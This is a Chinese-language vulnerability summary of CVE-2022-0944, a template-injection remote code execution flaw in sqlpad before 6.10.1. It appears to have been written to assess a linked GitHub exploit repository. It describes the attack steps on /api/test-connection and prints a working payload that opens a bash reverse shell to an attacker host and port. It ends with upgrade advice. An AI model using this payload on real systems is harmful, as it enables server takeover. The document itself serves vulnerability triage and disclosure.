## CVE-2022-0944-sqlpad-RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致RCE

**影响应用:** sqlpad

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 6.10.1

**利用条件:** 需要具有连接测试的权限（高权限用户）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-0944 是 sqlpad 中存在的一个模板注入漏洞，位于连接测试端点。攻击者可以通过构造恶意的模板注入payload，在目标服务器上执行任意代码，从而获得服务器的控制权。

**有效性：**

根据漏洞库信息、搜索结果以及提供的漏洞利用代码，该漏洞利用是有效的。漏洞库信息明确指出存在模板注入导致RCE的漏洞，搜索结果也指向了相关漏洞细节和POC。提供的PHP代码通过向 `/api/test-connection` 发送包含恶意payload的JSON数据，从而触发远程代码执行。

**投毒风险：**

分析提供的`exploit.php`代码，未发现明显的恶意代码或后门。该脚本的功能主要是发送包含模板注入payload的HTTP请求，以触发目标服务器上的RCE。脚本的逻辑清晰，且直接使用了cURL库发送请求，没有发现任何尝试隐藏或执行其他恶意操作的代码。脚本只是一个exploit，不是后门。

**利用方式：**

1.  **漏洞点：** `/api/test-connection` 接口的 `database` 字段存在模板注入。
2.  **攻击步骤：**
    *   攻击者需要先监听一个端口（例如4444）。
    *   攻击者构造包含恶意代码的JSON数据，恶意代码通常是反弹shell的命令。
    *   攻击者将构造好的JSON数据发送到 `/api/test-connection` 接口。
    *   如果目标服务器存在漏洞，且模板引擎执行了攻击者的恶意代码，目标服务器会反弹shell到攻击者的监听端口。
3.  **Payload：**

    ```
    {{ process.mainModule.require('child_process').exec('/bin/bash -c "bash -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1"') }}
    ```

    该payload使用Node.js的 `child_process.exec` 函数执行系统命令，`/bin/bash -c` 执行一段bash脚本，该脚本的作用是创建一个反向shell连接到攻击者的IP地址和端口。

**总结：**

CVE-2022-0944 是一个高危漏洞，攻击者可以利用该漏洞远程执行任意代码。需要及时升级 sqlpad 到 6.10.1 或更高版本。

**项目地址:** [LipeOzyy/SQLPad-RCE-Exploit-CVE-2022-0944](https://github.com/LipeOzyy/SQLPad-RCE-Exploit-CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)